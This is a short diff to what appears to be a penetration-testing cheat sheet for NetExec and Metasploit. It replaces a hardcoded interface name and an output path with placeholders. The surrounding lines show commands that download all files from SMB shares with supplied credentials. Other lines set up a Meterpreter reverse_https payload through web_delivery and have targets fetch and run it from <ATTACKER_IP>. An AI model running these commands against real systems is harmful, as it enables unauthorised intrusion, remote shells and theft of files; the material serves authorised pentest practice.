@@ -361,7 +361,7 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
 Download all files from all shares except the excluded defaults; max file size `1 MB`
 
 ```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 1)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
+nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/my_data/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 1)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
 ```
 
 ### `gpp_password`
@@ -714,7 +714,7 @@ sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -X '<COMMAND>'
 
 ```bash
 # web_delivery
-sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST tun0; set LPORT 50000; set SRVPORT 8080; exploit"
+sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST <INTERFACE>; set LPORT 50000; set SRVPORT 8080; exploit"
 
 # Grab RAND from MSF output then:
 nxc smb <TARGET> -u <USER> -p '<PASS>' -M web_delivery -o PAYLOAD=64 URL="http://<ATTACKER_IP>:8080/<RAND>"
@@ -722,7 +722,7 @@ nxc smb <TARGET> -u <USER> -p '<PASS>' -M web_delivery -o PAYLOAD=64 URL="http:/
 
 ```bash
 # met_inject
-sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST tun0; set LPORT 50000; set SRVPORT 8080; exploit"
+sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST <INTERFACE>; set LPORT 50000; set SRVPORT 8080; exploit"
 
 # Grab RAND from MSF output then:
 nxc smb <TARGET> -u <USER> -p '<PASS>' -M met_inject -o SRVPORT=8080 SSL=true SRVHOST=<ATTACKER_IP> RAND=<RAND_STRING>
